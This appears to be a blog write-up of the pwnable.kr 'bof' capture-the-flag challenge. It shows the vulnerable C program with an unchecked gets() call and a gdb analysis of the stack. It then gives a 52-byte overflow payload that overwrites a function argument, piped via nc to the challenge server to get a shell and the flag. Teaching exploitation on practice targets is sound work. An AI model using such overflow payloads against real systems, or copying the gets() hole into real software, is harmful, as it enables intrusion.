---
title: bof
date: 2020-12-25 04:23:32 +/-TTTT
categories: [CTF, pwnable]
tags: [buffer overflow,c,assembly]
---

## Analyze

Let's start with source code.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```
main function call `func` with argument `0xdeadbeef`.

lets take look at `func()`

```c
char overflowme[32];
``` 
it create `overflowme` variable and asign 32 buffer space.

```c
printf("overflow me : ");
gets(overflowme);
```
next it print "overflow me" and then read value from user.

```
if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
```

it check if `key`  is equal to `0xcafebabe` if yes then it give a shell otherwise it print `Nah..`.

## Exploitation

In this challenge we doesn't need to find offset and create shellcode.
we just need to overwrite `0xdeadbeef` with `0xcafebabe` and we can spawn shell.

lets play with  binary in gdb.

First we set breakpoint at `main`.

```bash
gef➤  break main                                                                                            
Breakpoint 1 at 0x68d                                 
gef➤  run  
```

Now program stop executing at `main`. Lets disassemble `func` and see how it work.

```asm
gef➤  disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e3e330 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e3d850 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e12f10 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e3e330 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7ee1930 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.

```

on `0x56555654` we can see it compare `0xcafebabe` with `func` argument which is `0xdeadbeef`.

we set breakpoint exactly `0x56555654`.

Set breakpoint and continue executation.it ask for input. we provide `bbbbbbbbbbbbbbb`. here we need to provide short input because we don't want to crash the program. we just want to see normal executation flow of program.

```bash
gef➤  break *0x56555654
Breakpoint 2 at 0x56555654
gef➤  c
Continuing.
overflow me : 
bbbbbbbbbbbbbbb 
```

program hit our second breakpoint. now lets examine the memory.

```asm
gef➤  x/50wx $esp
0xffffd590:     0xffffd5ac      0x00000000      0xf7ffd000      0x00000000
0xffffd5a0:     0x00000000      0x00000000      0x56555034      0x62626262
0xffffd5b0:     0x62626262      0x62626262      0x00626262      0x5655549d
0xffffd5c0:     0xf7fb33fc      0xffffffff      0x56556ff4      0x2afbe700
0xffffd5d0:     0x56556ff4      0xf7fb3000      0xffffd5f8      0x5655569f
0xffffd5e0:     0xdeadbeef      0x00000000      0x565556b9      0x00000000
0xffffd5f0:     0xf7fb3000      0xf7fb3000      0x00000000      0xf7decdf6
0xffffd600:     0x00000001      0xffffd6a4      0xffffd6ac      0xffffd634
0xffffd610:     0xffffd644      0xf7ffdb40      0xf7fcd410      0xf7fb3000
0xffffd620:     0x00000001      0x00000000      0xffffd688      0x00000000
0xffffd630:     0xf7ffd000      0x00000000      0xf7fb3000      0xf7fb3000
0xffffd640:     0x00000000      0xa4e739cb      0xe6d067db      0x00000000
0xffffd650:     0x00000000      0x00000000
```

here we can see our input we give `b` as `0x62`. and at `0xffffd5e0` memory address `0xdeadbeef`. 

Next we have to find out how many bytes we need to overwrite `0xdeadbeef`. here we need 13\*4=52 byets to overwrite `0xdeadbeef`. now we can build our payload.

```python
python -c 'print "a" * 52 + "\xbe\xba\xfe\xca" ' > exploit
```
we save our payload as `exploit` and send this to server.

```bash
➜  temp (cat exploit && cat) | nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
cat flag
daddy, I just pwned a buFFer :)
```
